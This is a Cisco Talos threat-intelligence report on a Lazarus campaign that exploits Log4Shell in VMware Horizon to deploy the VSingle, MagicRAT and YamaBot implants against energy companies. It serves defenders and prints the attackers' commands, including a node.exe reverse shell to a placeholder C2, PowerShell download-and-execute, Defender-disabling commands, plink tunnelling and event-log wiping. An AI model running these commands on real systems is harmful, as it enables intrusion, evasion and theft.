Lazarus and the tale of three RATs
blog.talosintelligence.com/2022/09/lazarus-three-rats.html

By Jung soo An,Asheer Malhotra and Vitor Ventura.
Cisco Talos has been tracking a new campaign operated by the Lazarus APT group, attributed to North Korea
by the United States government.
This campaign involved the exploitation of vulnerabilities in VMWare Horizon to gain an initial foothold into
targeted organizations.
Targeted organizations include energy providers from around the world, including those headquartered in the
United States, Canada and Japan.
The campaign is meant to infiltrate organizations around the world for establishing long term access and
subsequently exfiltrating data of interest to the adversary's nation-state.
Talos has discovered the use of two known families of malware in these intrusions — VSingle and YamaBot.
Talos has also discovered the use of a recently disclosed implant we're calling "MagicRAT" in this campaign.

Introduction
Cisco Talos observed North Korean state-sponsored APT Lazarus Group conducting malicious activity between
February and July 2022. Lazarus has been previously attributed to the North Korean government by the U.S.
Cybersecurity and Infrastructure Security Agency (CISA). The entry vectors involve the successful exploitation of
vulnerabilities in VMWare products to establish initial footholds into enterprise networks, followed by the
deployment of the group's custom malware implants, VSingle and YamaBot. In addition to these known malware
families, we have also discovered the use of a previously unknown malware implant we're calling "MagicRAT."

1/23

This campaign was previously partially disclosed by other security firms, but our findings reveal more details about
the adversary's modus operandi. We have also observed an overlap of command and control (C2) and payloadhosting infrastructure between our findings and the U.S. Cybersecurity and Infrastructure Security Agency's (CISA)
June advisory that detailed continued attempts from threat actors to compromise vulnerable VMWare Horizon
servers.
In this research, we illustrate Lazarus Group's post-exploitation tactics, techniques and procedures (TTPs) to
establish a foothold, perform initial reconnaissance, deploy bespoke malware and move laterally across infected
enterprises. We also provide details about the activities performed by the attackers when the VSingle backdoor is
instrumented on the infected endpoints.
In this campaign, Lazarus was primarily targeting energy companies in Canada, the U.S. and Japan. The main goal
of these attacks was likely to establish long-term access into victim networks to conduct espionage operations in
support of North Korean government objectives. This activity aligns with historical Lazarus intrusions targeting
critical infrastructure and energy companies to establish long-term access to siphon off proprietary intellectual
property.

Attribution
Cisco Talos assesses with high confidence these attacks have been conducted by the North Korean statesponsored threat actor Lazarus Group. During our investigations, we identified three distinct RATs being employed
by the threat actors, including VSingle and YamaBot, which are exclusively developed and distributed by Lazarus.
The Japanese CERT (JPCERT/CC) recently published reports (VSingle, YamaBot), describing them in detail and
attributed the campaigns to the Lazarus threat actor.
The TTPs used in these attacks also point to the Lazarus threat actor. The initial vector was the exploitation of the
Log4j vulnerability on exposed VMware Horizon servers. Successful post-exploitation led to the download of their
toolkit from web servers. The same initial vector, URL patterns and similar subsequent hands-on-keyboard activity
have been described in this report from AhnLab from earlier this year. There are also overlapping IOCs between

2/23

the campaign described by AhnLab and the current campaign, such as the IP address 84[.]38.133[.]145, which was
used as a hosting platform for the actors' malicious tools. Although the same tactics have been applied in both
attacks, the resulting malware implants deployed have been distinct from one another, indicating the wide variety of
implants available at the disposal of Lazarus. Additionally, we've also observed similarities in TTPs disclosed by
Kaspersky attributed to the Andariel sub-group under the Lazarus umbrella, with the critical difference being the
deployment of distinct malware. While Kaspersky discovered the use of Dtrack and Maui, we've observed the use
of VSingle, YamaBot and MagicRAT.
Cisco Talos acknowledges that when analyzed individually, the attribution evidence only reaches mediumconfidence, however, we're raising our confidence level when analyzing all these points in the context of the
campaign and victims.

Campaign
Cisco Talos has observed several attacks targeting multiple victims. In this section, we detail two specific attack
instances that we assess have been the most representative of the playbooks employed by Lazarus in this
campaign:
Victim 1: Illustrates the kill chain from exploitation to actions on objectives. This intrusion also illustrates the
use of the VSingle implant.
Victim 2: Represents a kill chain similar to Victim 1 but in this instance, we observed the deployment of a new
implant we're calling "MagicRAT" along with VSingle.
A third intrusion set worth noting here is one where we saw the use of a third bespoke implant known as YamaBot.
YamaBot was recently disclosed and attributed to the Lazarus APT by the Japan Computer Emergency Response
Team Coordination Center (JPCERT/CC).

3/23

Victim No. 1: VSingle and beyond
In the case of the first victim, we observed the exploitation of publicly known vulnerabilities to ultimately deploy the
VSingle backdoor on infected endpoints to establish long-term access.

4/23

In this specific instance, we also observed the actual instrumentation of VSingle implants to carry out additional
malicious activities on the infected systems. The flow below provides an overview of the attacker's playbook, which
will be detailed in the sections ahead.

Exploitation and foothold
Cisco Talos identified the exploitation of the Log4Shell vulnerability on VmWare Horizon public-facing servers as
the initial attack vector [T1190]. The compromise is followed by a series of activities to establish a foothold [TA0001]
on the systems before the attackers deploy additional malware and move laterally across the network. During our
investigation, we discovered two different foothold payloads. In the first, the attackers abuse node.exe, which is
shipped with VMware to execute the oneliner node.exe script below.

5/23

C:"Program Files"\VMware"VMware View"\Server\appblastgateway\node.exe -r net -e "sh =
require('child_process').exec('cmd.exe');var client = new net.Socket();client.connect(<Port>, '<C2_IP>',
function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});"

This essentially opens an interactive reverse shell that attackers could use to issue arbitrary commands on the
infected entry endpoint.
In another instance, we observed the attackers exploiting vulnerabilities in VMWare to launch custom PowerShell
scripts on the infected endpoint via VMWare's ws_ConnectionServer.exe:
powershell -exec bypass IEX (New-Object
Net.WebClient).DownloadString('http://<remote_location>/<filename>.ps1')

Since VMWare Horizon is executed with administrator privileges, the attacker doesn't have to worry about elevating
their privileges.
After the interactive shell is established, the attackers perform a preliminary reconnaissance on the endpoint to get
network information and directory listings [T1083], [T1590], [T1518]:
ipconfig /all
dir c:"Program Files (x86)
dir c:"Program Files
The next step is the deactivation of the Windows Defender components [T1562]. This is done through registry key
changes, WMIC commands and PowerShell commands. The list below contains the full list of methods Cisco Talos
observed.
powershell -exec bypass -Command Get-MpPreference
powershell.exe -ExecutionPolicy Bypass -command Set-MpPreference -DisableRealtimeMonitoring $true
reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection
/s /f DisableRealtimeMonitoring
Once the AV on the system has been bypassed using the reverse shell, the attackers then deploy the actual
malware implant from a malware family known to be developed and operated by Lazarus called "VSingle."
The deployment consists of downloading a copy of the legitimate WinRAR utility from a remote location controlled
by the attackers along with an additional payload (archive) [T1608]:
powershell -exec bypass -command (New-Object
System.Net.WebClient).DownloadFile('<remote_location>\\rar.tmp', '<local_path>\\rar.exe')
powershell -exec bypass -command (New-Object
System.Net.WebClient).DownloadFile('<remote_location>\\update.tmp <local_path>\\java.tmp')
<local_path>\\rar.exe e <local_path>\\java.tmp <local_path_2> -hp!no!
The archive downloaded to the infected endpoint is decompressed and consists of the VSingle malware executable
which is optionally renamed and then persisted on the endpoint by creating an auto-start service.
How is VSingle used?

6/23

Our investigations led to the discovery of commands fed to the VSingle backdoor by the attackers to carry out a
variety of activities such as reconnaissance, exfiltration and manual backdooring.
The actor starts by performing additional reconnaissance tasks by running the commands below [T1083], [T1590].

These commands will give the operators a solid understanding of the system they are in, including the installed
software, network configuration and system users, among other things. This kind of information is crucial to
preparing for lateral movement activities.
The attackers also force the system to cache credentials so that it is possible to harvest them afterward
[T1003/005].

These could be used if the RAT is detected/removed or even provide the actors with an RDP access, avoiding the
use of a malicious tool.
With VSingle in place, the attackers can access other systems with the help of two additional tools.
pvhost.tmp renamed to pvhost.exe, which is actually plink.exe, a utility from Putty that can create SSH
tunnels between systems.
osc.tmp renamed to osc.exe, which we assess with high confidence is 3proxy. Unfortunately, Cisco Talos
could not obtain a copy of the file.
These two tools working together create a proxy on the victim system which has its listening port "exported" to a
port on a remote host. This mechanism allows the attacker to have a local proxy port that gives access to the victim
network as if the attacker's box was on it directly.
First, the attackers start the osc.exe (3proxy) to listen on a loopback port (in this example, we chose 8118), with the
command below.
C:\Windows\system32\config\systemprofile\AppData\Roaming\microsoft\osc.exe -i127.0.0.1 -p8118

This alone wouldn't help the attackers, they actually need to have port 8118, exposed on their own network that
they can connect to. So, they created an SSH tunnel using Plink, but they forwarded a local port to a remote
address, in this case, a remote server controlled by the attackers:
C:\Windows\system32\config\systemprofile\AppData\Roaming\microsoft\pvhost.exe -N -R 18118:127.0.0.1:8118 P [Port] -l [username] -pw [password] <Remote_IP>

The option -R forwards the port 8118 on 127.0.0.1 to the remote server on port 18118.
VSingle RAT Analysis
The VSingle loader executable is an MFC-based backdoor that consists of multiple layers. The first is responsible
for decoding and executing the next layer (layer 2), a shellcode in the memory of the implant process. The
shellcode is simply an injector for the next layer (layer 3, also shellcode). The implant spawns a new "explorer.exe"
process and injects shellcode (layer 3) into it for execution.
The layer 3 shellcode is injected into a newly spawned benign process, such as explorer.exe, which consists of
decoding another layer (layer 4) of shellcode that is then executed in the benign process.
Layer 4 is the actual VSingle implant DLL loaded reflectively into the memory of the benign process.

8/23

The implant is simple in terms of functionalities and is basically a stager that enables the attackers to deploy more
malware on the infected system. It also includes the ability to open a reverse shell that connects to the C2 server
and allows untethered access to the attackers to the endpoint to execute commands via "cmd.exe."
Although a rather simple RAT, VSingle can download and execute additional plugins from the C2 server. These
plugins can either be in the form of shellcode or script files of specific formats served by the C2. The image below
shows the code used to execute a shellcode downloaded.

In-memory shellcode execution by the implant.
For simpler cases, the implant can receive executables or scripts, save them into a file in the %temp% directory
and execute them on the endpoint. The implant supports the .vbs, .bat and .tmp files, since all of them are
executed through "cmd /c." The .tmp files can also be loaded as executables (.exe).
The implant can achieve persistence for malware artifacts served and specified by the C2 server. The simpler
mechanism is the creation of a file in the Startup folders, which is done in two different locations:

9/23

c:\Documents and Settings\%s\Start Menu\Programs\Startup\%s
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
Additionally, there are three other ways available, all of which use the "cmd.exe /c" command, that the VSingle
operators can use:

Victim No. 2: The discovery of MagicRAT
In another victim's network, we saw a similar chain of events: initial recon followed by disabling the AV software and
the deployment of a bespoke implant. We also observed successful lateral movement into other endpoints in the
enterprise.

What's unique in this intrusion, however, is that we observed the deployment of a fairly new implant three days
before the attackers deployed VSingle on the infected systems.
This implant called "MagicRAT" is outlined in a recently published post. The reverse interactive shell eventually
downloads MagicRAT from a remote location.
MagicRAT Analysis
In this campaign, MagicRAT was configured with a different configuration file and path. It also reported to different
C2 servers. The configuration directory is now called "MagicMon" in the current user's "AppData\Roaming"
directory. As seen in the screenshot below, this folder creates and hosts an initialization file named
"MagicSystem.ini." This INI file contains several configurations including the list of C2 URLs that can be used by
the implant to send and receive commands and data.

Lateral Movement
During the first few days after the successful initial access, the attackers conducted limited reconnaissance of the
endpoint and deployed two different malware families MagicRAT and VSingle on the infected endpoint to maintain
covert access to the system. Just like with the first victim, the attackers then started to perform Active Directory
(AD) related explorations (via impacket and VSingle) to identify potential endpoints to laterally move into. The table
below illustrates the commands executed to perform such actions.

Once the list of computers and users is obtained, the attackers would manually ping specific endpoints in the list to
verify if they are reachable (with an occasional tracert). VSingle deployment on new hosts was done by using
WMIC to start a remote process. This process was, in fact, a PowerShell snippet that would download VSingle from
a remote system [T1608/001].
WMIC /node:<Computer_Name> process call create "powershell.exe (New-Object
System.Net.Webclient).DownloadFile('<remote_location>/svhostw.exe','<local_path>\\svhostww.exe')"

In some infections, we observed the deployment of impacket tools on other endpoints to move laterally and
establish an interactive shell.
This stage of the attacks was clearly manual work performed by a human operator. While trying to establish
interactive remote console sessions, we can see the operators making errors on the commands.

The attackers typically take their time to explore the infected system by obtaining file listings of multiple directories
of interest to them. When files of particular interest are found they are put into a .rar archive for exfiltration, typically
via one of the custom-developed implants running on the system.

Victim No. 3: VSingle makes way for YamaBot
During one particular intrusion, the attackers first deployed VSingle on the endpoint. However, after the VSingle
sample was detected, the attackers were at risk of losing access to the enterprise. Therefore, after repeated failed
attempts to deploy VSingle on the endpoints, the attackers then deployed another updated copy of VSingle. After
maintaining continued access for a while, the attackers then moved on to the use of another implant — YamaBot.
YamaBot is a custom-made GoLang-based malware family. It uses HTTP to communicate with its C2 servers. It
typically begins by sending preliminary system information about the infected endpoint to the C2: computer name,
username and MAC address.

12/23

YamaBot's helper function names.
This implant has standard RAT capabilities, including the ability to:
List files and directories.
Send process information to C2.
Download files from remote locations.
Execute arbitrary commands on the endpoints.
Uninstall itself.
YamaBot was recently attributed to the Lazarus APT group by JPCERT who provided an excellent analysis of the
implant.

Credential Harvesting
Apart from the usual recon and deployment of the custom implants, we also observed Lazarus' use of completely
different TTPs for credential harvesting. The attackers created backups of volumes that were then used to create a
copy of the "ntds.dit" file for exfiltration containing Active Directory data.

The Variations in the playbook
The overall structure of the infection chains remained the same across multiple intrusions in this campaign,
primarily consisting of the cyber kill chain that we illustrated at the beginning of the campaign section.
However, there were some key variations that consist of some optional activities conducted by the adversary in
different intrusion sets. These variations include the use of:
Credential harvesting using tools such as Mimikatz and Procdump.
Proxy tools to set up SOCKs proxies.
Reverse tunneling tools such as PuTTY's plink.
It is therefore necessary to list all the TTPs used by the adversary across all the intrusions we've discovered in this
campaign. This section provides an additional list of TTPs and commands used by the operators along with their
corresponding MITRE ATT&CK IDs to help defenders better understand this APT's offensive playbook.
Note: There is some overlap between operations (common or similar commands) carried out via the reverse shell,
the VSingle RAT and impacket tools. This could be because there might be multiple human operators manually
executing their own set of commands based on their shift days and timings (without proper handover of information
collected and percolated from one operator to another).
For example, in one instance, the attackers tried to obtain Active Directory information on one endpoint via
PowerShell cmdlets. However, a day later, the attackers used adfind.exe to extract similar information on the same
endpoint.

Disabling AV components
The threat actors used multiple variations of commands to query information about the installed antivirus software
on the endpoints, followed by disabling the Windows Defender antivirus.

Reconnaissance
During the reconnaissance and credential harvesting stage, the attackers gather information about the system, the
network — including the domain — and the installed software. Using a WMIC command, the attackers also collect
information about the logical drives of the infected systems.
Then, the attackers harvest and exfiltrate credentials. During the reconnaissance stage, the attackers specifically
check if the RDP port is open. If it is and the attackers decrypt any of the harvested credentials, they would have
direct access to the system without the need to install any other backdoor. The complete list of commands is
provided in the table below.

Unauthorized account creations
In most instances, the attackers instrumented the reverse shell to create their own user accounts on the endpoints
they had initial access to. Similar activity was also seen being conducted via the VSingle implant as it was
propagated across an enterprise.

Additional tools used
In some cases, the attackers deployed commonly used tools often seen from other threat actors.
Mimikatz
The attackers downloaded the Mimikatz tool from their server, inside a .rar archive protected with a password,
which prevents any kind of detection by network intrusion prevention systems.

Implant deployment and lateral movement

18/23

Across the first endpoints compromised in the enterprises, we observed the attackers downloading their custom
implants from remote locations and deploying and persisting them on the systems.
Command

Intent

WMIC /node:<Computer_Name> process call create "powershell.exe (New-Object
System.Net.Webclient).DownloadFile('<remote_location>/svhostw.exe','<local_path>\\svhostww.exe')"

[T1608/001]

Persistence
[T1543/003]

On the endpoints that were breached by performing lateral movement from an already compromised host, the
implants were deployed either from a remote external location or the source host itself by opening up interactive
shells and the use of implacket tools:
Command

Intent

powershell.exe Enter-PSSession

[T1219]

powershell.exe Invoke-Command -ComputerName <ComputerName> -ScriptBlock {cmd.exe

\\127.0.0.1\ADMIN$\<impacket_log_file> 2>&1

Remote Access
[T1219]

Cleanup
Once the backdoors and implants were persisted and activated on the endpoint, the reverse shell used to perform
cleanup [T1070], this included deleting all files in the infection folder along with the termination of the powershell
tasks. The attacker-created accounts were removed and, finally, the Windows Event logs [T1070/001] would be
purged with the command below.
for /F tokens=* %1 in ('wevtutil.exe el') DO wevtutil.exe cl %1 1> \\127.0.0.1\ADMIN$\<log_file_name> 2>&1

Manual operations
In multiple instances, the attackers mistyped commands on the infected endpoint via the reverse shell, indicating
that the commands were being served by an operator manually operating the infections:
ip config /all
net suer
netstat -noa | finstr 3389
powrshell.exe Get-AdUser -Filter * -Properties * | Select Name, logonCount
powrshell.exe Get-AdComputer -Filter * -Properties * | select Name, LastLogonDate, lastLogon, IPv4Address
